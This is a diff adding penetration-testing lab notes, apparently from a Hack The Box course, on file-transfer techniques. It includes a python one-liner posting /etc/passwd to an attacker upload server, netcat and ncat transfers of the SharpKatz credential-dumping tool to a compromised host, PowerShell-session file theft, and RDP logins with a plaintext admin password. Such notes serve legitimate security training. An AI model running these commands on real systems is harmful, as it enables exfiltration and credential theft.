@@ -77,3 +77,90 @@ zapstiko@htb[/htb]$ python3 -m uploadserver
 ```
 zapstiko@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
+
+
+# Miscellaneous File Transfer Methods
+
+**File Transfer with Netcat and Ncat**
+```
+victim@target:~$ # Example using Original Netcat
+victim@target:~$ nc -l -p 8000 > SharpKatz.exe ( NetCat - Compromised Machine - Listening on Port 8000 )
+
+```
+**Netcat - Attack Host - Sending File to Compromised machine**
+```
+zapstiko@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+zapstiko@htb[/htb]$ # Example using Ncat
+zapstiko@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+```
+**Attack Host - Sending File as Input to Netcat**
+```
+zapstiko@htb[/htb]$ # Example using Original Netcat
+zapstiko@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+```
+**Compromised Machine Connect to Netcat to Receive the File**
+```
+victim@target:~$ # Example using Original Netcat
+victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
+```
+**Attack Host - Sending File as Input to Ncat**
+```
+zapstiko@htb[/htb]$ # Example using Ncat
+zapstiko@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+**Compromised Machine Connect to Ncat to Receive the File**
+```
+victim@target:~$ # Example using Ncat
+victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+```
+**NetCat - Sending File as Input to Netcat**
+```
+zapstiko@htb[/htb]$ # Example using Ncat
+zapstiko@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+
+## PowerShell Session File Transfer
+
+
+**01. From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.**
+```
+PS C:\htb> whoami
+
+htb\administrator
+
+PS C:\htb> hostname
+
+DC01
+```
+
+**02. From DC01 - Confirm WinRM port TCP 5985 is Open on**
+
+```
+PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+
+ComputerName     : DATABASE01
+RemoteAddress    : 192.168.1.101
+RemotePort       : 5985
+InterfaceAlias   : Ethernet0
+SourceAddress    : 192.168.1.100
+TcpTestSucceeded : True
+```
+**03. Create a PowerShell Remoting Session to DATABASE01**
+```
+PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+**04.Copy DATABASE.txt from DATABASE01 Session to our Localhost**
+```
+PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+## RDP
+
+**Mounting a Linux Folder Using rdesktop**
+```
+zapstiko@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+```
+**Mounting a Linux Folder Using xfreerdp**
+```
+zapstiko@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+```
